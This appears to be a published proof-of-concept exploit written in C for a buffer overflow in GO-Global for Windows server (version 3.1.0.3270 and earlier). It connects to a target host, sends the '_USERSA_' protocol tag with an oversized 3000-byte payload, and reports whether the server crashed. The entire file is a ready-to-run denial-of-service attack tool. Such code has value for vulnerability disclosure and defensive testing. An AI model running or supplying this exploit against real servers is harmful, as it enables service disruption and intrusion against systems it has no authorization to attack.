/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>
#endif



#define VER     "0.1"
#define PORT    491
#define BOFSZ   3000
#define GGWXP   "_USERSA_"
#define GGWXPSZ (sizeof(GGWXP) - 1)



u_int resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int     sd,
            len;
    u_short port = PORT;
    u_char  buff[GGWXPSZ + 2 + BOFSZ],
            *p;

#ifdef WIN32
    WSADATA wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif


    setbuf(stdout, NULL);

    fputs("\n"
        "GO-Global for Windows server <= 3.1.0.3270 buffer-overflow "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <host> [port(%hu)]\n"
            "\n", argv[0], port);
        exit(1);
    }

    if(argc > 2) port = atoi(argv[2]);

    peer.sin_addr.s_addr = resolv(argv[1]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr), port);

    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) std_err();
    if(connect(sd, (struct sockaddr *)&peer, sizeof(peer))
      < 0) std_err();

    p = buff;
    memcpy(p, GGWXP, GGWXPSZ);
    p += GGWXPSZ;

    *(u_short *)p = htons(BOFSZ);
    p += 2;
    memset(p, 'a', BOFSZ);
    p += BOFSZ;
    send(sd, buff, p - buff, 0);

    len = recv(sd, buff, sizeof(buff), 0);
    close(sd);

    if(len <= 0) {
        fputs("- server has terminated the connection, it is probably vulnerable\n", stdout);
    } else {
        if(len > GGWXPSZ) len = GGWXPSZ;
        if(memcmp(buff, GGWXP, len)) {
            fputs("- this server is not a valid GO-Global for Windows server\n", stdout);
            exit(1);
        }
    }

    fputs("- the server should be crashed, check it manually\n", stdout);
    return(0);
}



u_int resolv(char *host) {
    struct  hostent *hp;
    u_int   host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_int *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


